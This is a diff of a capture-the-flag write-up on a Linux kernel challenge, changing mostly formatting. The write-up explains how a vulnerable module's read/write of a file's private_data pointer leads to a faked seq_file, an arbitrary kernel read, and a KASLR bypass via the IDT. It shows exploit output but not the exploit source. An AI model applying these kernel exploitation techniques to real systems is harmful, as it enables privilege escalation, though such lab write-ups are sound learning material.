@@ -18,7 +18,7 @@ But it also turns out that its pretty bad at coming up with an exploit strategy 
 ## The challenge
 We're given all the usual stuff for a kernel challenge including the `bzImage`, `rootfs.ext4`, a `run` script and the source code for the vulnerable kernel module.
 
-Here's the important bits from the module:
+Here's the important bit from the module:
 ```c
 typedef struct {
   int fd;
@@ -70,22 +70,22 @@ static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
 }
 ```
 
-What this module basically does it allow the user to read or write the `private_data` member in a `struct file` which is a `void *` pointer which I assumed would be something that can store any extra data.
+What this module basically does is, it allows the user to read or write a `void *private_data` member in a `struct file` which I assumed would be something that can store any extra data.
 
 After consulting with ChatGPT, I learned that this `private_data` pointer is just a `NULL` pointer for regular files on disk, but for special files like the ones in `/proc/`, this pointer points to a special `struct seq_file` structure.
 
 This can easily be confirmed quickly by opening a file like `/proc/self/maps` and using its fd to read the `private_data` pointer using the module's `CMD_READ` command and comparing it with a regular file.
 
-```bash
-~ $ ./exploit
-Opening vulnerable device /dev/vuln.ko
-Opening /proc/self/maps (fd = 2)
-Opening /exploit.c (fd = 3)
-Sending ioctl to read from /proc/self/maps (request.fd = 2)
-Val = ffff8ab001b67000
-Sending ioctl to read from /exploit.c (request.fd = 3)
-Val = 0
-```
+<pre>
+<span style="color:#6c6;">~ $</span> <span style="color:#69f;">./exploit</span>
+<span style="color:#ccc;">Opening vulnerable device</span> <span style="color:#f96;">/dev/vuln.ko</span>
+<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(fd = 2)</span>
+<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(fd = 3)</span>
+<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(request.fd = 2)</span>
+<span style="color:#9f9;">Val = ffff8ab001b67000</span>                 <----- Leaked private_data pointer for /proc/self/maps
+<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(request.fd = 3)</span>
+<span style="color:#9f9;">Val = 0</span>                                <----- NULL pointer for regular file
+</pre>
 
 So, this confirms that the `private_data` pointer for `/proc/self/maps` is indeed a valid pointer to a `struct seq_file`.
 With this knowledge, the next step is to figure out how to fake a `struct seq_file` to get the flag.
@@ -96,12 +96,12 @@ The flag is mounted into the VM as a drive:
 ```
 
 It's available inside the VM as `/dev/sdb`
-```bash
-~ # whoami
-root
-~ # cat /dev/sdb
-FLAG{dummy}
-```
+<pre>
+<span style="color:#6c6;">~ $</span> <span style="color:#69f;">whoami</span>
+<span style="color:#f96;">root</span>
+<span style="color:#6c6;">~ $</span> <span style="color:#69f;">cat /dev/sdb</span>
+<span style="color:#f96;">FLAG{dummy}</span>
+</pre>
 
 So, our objective is to just run `cat /dev/sdb` as root.
 
@@ -223,16 +223,17 @@ And combined with an lseek, I could trigger the branch that executes the `goto D
 ```
 
 And this was working and printing the flag on my machine:
-```
-# ./exploit
-Opening vulnerable device...
-Opening /proc/self/maps...
-Sending ioctl to read from sys file
-Private data leak = 0xffff888002f67b40
-Finished spray
-Overwriting private_data with 0xffff888002b39000
-FLAG FLAG{dummy}
-```
+<pre>
+<span style="color:#6c6;">#</span> <span style="color:#69f;">./exploit</span>
+<span style="color:#ccc;">Opening vulnerable device...</span>
+<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps...</span>
+<span style="color:#ccc;">Sending ioctl to read from sys file</span>
+<span style="color:#9f9;">Private data leak = 0xffff888002f67b40</span>
+<span style="color:#ccc;">Finished spray</span>
+<span style="color:#9f9;">Overwriting private_data with 0xffff888002b39000</span>
+<span style="color:#ff5555;font-weight:bold;">FLAG FLAG{dummy}</span>
+</pre>
+
 
 But this wasn't working on anyone else's machine.
 However, I could just replace the `flag_addr` with any address that I wanted to read which was basically an arbitrary read primitive.
@@ -247,16 +248,17 @@ The Interrupt Descriptor Table (IDT), apparently is always at the address `0xfff
 According to @zolutal, everything in the CPU Entry Area is randomized except for this IDT.
 Now this IDT is a table of `struct idt_entry` elements.
 And each `struct idt_entry` has a layout like this:
-```
-offset  size  field
-------  ----  ----------------------------
-0x00     2    offset0      (addr bits 0..15)
-0x02     2    selector
-0x04     2    ist:type:dpl:p  (attributes word)
-0x06     2    offset1      (addr bits 16..31)
-0x08     4    offset2      (addr bits 32..63)
-0x0c     4    reserved
-```
+<pre>
+<span style="color:#69f;">offset</span>  <span style="color:#69f;">size</span>  <span style="color:#69f;">field</span>
+<span style="color:#aaa;">------  ----  ----------------------------</span>
+<span style="color:#6c6;">0x00</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset0</span>      <span style="color:#aaa;">(addr bits 0..15)</span>
+<span style="color:#6c6;">0x02</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">selector</span>
+<span style="color:#6c6;">0x04</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">ist:type:dpl:p</span>  <span style="color:#aaa;">(attributes word)</span>
+<span style="color:#6c6;">0x06</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset1</span>      <span style="color:#aaa;">(addr bits 16..31)</span>
+<span style="color:#6c6;">0x08</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">offset2</span>      <span style="color:#aaa;">(addr bits 32..63)</span>
+<span style="color:#6c6;">0x0c</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">reserved</span>
+</pre>
+
 
 By reading the first element of the IDT, we can get a pointer to the kernel text segment which defeats KASLR.
 We don't need the whole `struct idt_entry` to do this, just the bytes from 4 to 12 which contains the `<offset2:4bytes><offset1:2bytes><ist:type:dpl:p:2bytes>` which gives us all but the last 2 bytes of the address.
